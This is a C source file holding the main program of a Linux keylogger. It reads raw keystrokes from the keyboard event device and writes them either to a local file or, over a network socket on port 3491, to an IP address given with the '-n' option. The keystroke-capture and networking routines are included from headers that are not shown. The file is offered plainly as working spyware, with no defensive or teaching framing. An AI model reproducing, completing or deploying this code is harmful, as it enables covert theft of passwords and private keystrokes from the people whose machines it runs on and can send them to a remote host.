#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include "keylogger.h"
#include "networking.h"

#define PORT "3491"

void print_usage_and_quit(char *application_name);

int main(int argc, char *argv[]){
    const char KEYBOARD_DEVICE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
    int writeout;
    int keyboard;


    int network = 0, file = 0, option = 0;
    char *option_input;
    while((option = getopt(argc, argv,"n:f:")) != -1){
        switch(option){
            case 'n':
                network = 1;
                option_input = optarg;
                break;
            case 'f':
                file = 1;
                option_input = optarg;
                break;
            default: print_usage_and_quit(argv[0]);
        }
    }

    // If both arguments or neither are provided...
    if(network == file){
        print_usage_and_quit(argv[0]);
    }
    else if(file){
        if((writeout = open(option_input, O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0){
            printf("Error opening file %s: %s\n", argv[2], strerror(errno));
            return 1;
        }
    }
    else if(network){
        writeout = get_socket_file_descriptor(option_input, PORT);
        if(writeout < 0){
            printf("Error creating socket on %s\n", option_input);
            return 1;
        }
    }

    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
        return 1;
    }


    keylogger(keyboard, writeout);

    close(keyboard);
    close(writeout);

    return 0;
}

void print_usage_and_quit(char *application_name){
    printf("Usage: %s [-n ip-address | -f output-file]\n", application_name);
    exit(1);
}
